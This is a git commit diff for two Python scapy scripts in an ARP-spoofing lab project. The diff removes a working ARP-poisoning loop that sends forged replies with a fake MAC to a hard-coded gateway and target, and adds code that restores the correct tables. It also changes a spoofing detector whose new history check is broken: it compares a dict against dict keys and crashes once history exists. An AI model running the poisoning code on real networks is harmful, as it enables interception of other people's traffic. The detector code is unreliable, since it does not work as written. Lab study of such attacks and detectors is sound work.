6dd3be725ad6f7416e6b8c3264db6aa940b924a3
guayacamole <guy.xd2000@gmail.com>
2024-06-30 18:30:00 -0600

    fix interface

--- ARP_spoofing/main.py
+++ ARP_spoofing/main.py
@@ -2,7 +2,6 @@ import os
 import scapy.all as scapy
 import time
 
-
 # Check for root privileges
 if not os.geteuid() == 0:
   exit("This script requires root privileges. Run it again with sudo.")
@@ -16,20 +15,23 @@ def get_mac(ip):
   return answered_list[0][1].hwsrc
 
 
-def spoof(target_ip, spoof_ip, fake_mac):
-  router_mac = get_mac(spoof_ip)
-  packet = scapy.ARP(op=2, pdst=spoof_ip, hwdst=router_mac,
-                     psrc=target_ip, hwsrc=fake_mac)
-  scapy.send(packet, verbose=False)
+def restore(target_ip, spoof_ip):
+  target_mac = get_mac(target_ip)
+  spoof_mac = get_mac(spoof_ip)
+  packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac,
+                     psrc=spoof_ip, hwsrc=spoof_mac)
+  # Send a few packets to ensure the ARP table is updated
+  scapy.send(packet, count=4, verbose=False)
 
 
-fake_mac = "de:ad:be:ef:de:ad"  # Fake MAC address
 target_ip = "192.168.122.178"  # IP of the target machine
 gateway_ip = "192.168.122.1"  # IP of the router
 
 try:
+  print("Restoring ARP tables...")
   while True:
-    spoof(target_ip, gateway_ip, fake_mac)
+    restore(target_ip, gateway_ip)
+    restore(gateway_ip, target_ip)
     time.sleep(2)  # Add delay to avoid flooding the network
 except KeyboardInterrupt:
-  print("\nARP spoofing stopped.")
+  print("\nARP tables restored to their correct state.")
--- apr_detector/main.py
+++ apr_detector/main.py
@@ -1,7 +1,7 @@
 from scapy.all import ARP, Ether, srp, conf
 import time
 
-# Set the network interface (replace 'eth0' with your interface)
+# Set the network interface
 conf.iface = "enp1s0"
 
 
@@ -16,40 +16,44 @@ def get_arp_table():
   return arp_table
 
 
-def detect_arp_spoofing(arp_table):
+def detect_arp_spoofing(arp_table, arp_history):
   ip_mac_mapping = {}
   for entry in arp_table:
     ip, mac = entry['ip'], entry['mac']
     if mac in ip_mac_mapping and ip_mac_mapping[mac] != ip:
-      print(f"ARP Spoofing Detected: MAC address {mac} is associated with multiple IPs: {ip_mac_mapping[mac]} and {ip}.")
+      print(f"ARP Spoofing Detected: MAC address {
+            mac} is associated with multiple IPs: {ip_mac_mapping[mac]} and {ip}.")
     if ip in ip_mac_mapping.values() and mac not in ip_mac_mapping:
-      print(f"ARP Spoofing Detected: IP address {ip} is associated with multiple MACs: {list(ip_mac_mapping.keys())[list(ip_mac_mapping.values()).index(ip)]} and {mac}.")
+      print(f"ARP Spoofing Detected: IP address {ip} is associated with multiple MACs: {
+            list(ip_mac_mapping.keys())[list(ip_mac_mapping.values()).index(ip)]} and {mac}.")
     ip_mac_mapping[mac] = ip
+
+  # Check for frequent changes in IP-MAC mappings
+  for history_table in arp_history:
+    for entry in arp_table:
+      if entry in history_table and entry['mac'] != history_table[entry['ip']]:
+        print(f"Potential ARP Spoofing: IP {entry['ip']} has changed MAC from {
+              history_table[entry['ip']]} to {entry['mac']}.")
 
 
 def detect_arp_changes():
+  arp_history = []
   initial_arp_table = get_arp_table()
   print("Initial ARP table:", initial_arp_table)
-  detect_arp_spoofing(initial_arp_table)  # Initial check for ARP spoofing
+  # Initial check for ARP spoofing
+  detect_arp_spoofing(initial_arp_table, arp_history)
 
   while True:
     time.sleep(5)  # Wait for 5 seconds before checking again
     current_arp_table = get_arp_table()
-    # print("Current ARP table:", current_arp_table)
-    # Check for ARP spoofing in the current ARP table
-    detect_arp_spoofing(current_arp_table)
+    detect_arp_spoofing(current_arp_table, arp_history)
 
-    # Detect new or removed devices (optional, based on your requirements)
-    for entry in current_arp_table:
-      if entry not in initial_arp_table:
-        print(f"New device detected: IP={entry['ip']}, MAC={entry['mac']}")
-    for entry in initial_arp_table:
-      if entry not in current_arp_table:
-        print(f"Device removed: IP={entry['ip']}, MAC={entry['mac']}")
-
-    initial_arp_table = current_arp_table
+    # Update ARP history
+    arp_history.append({entry['ip']: entry['mac']
+                       for entry in current_arp_table})
+    if len(arp_history) > 5:  # Keep the last 5 ARP tables
+      arp_history.pop(0)
 
 
-# Run the script
 if __name__ == "__main__":
   detect_arp_changes()
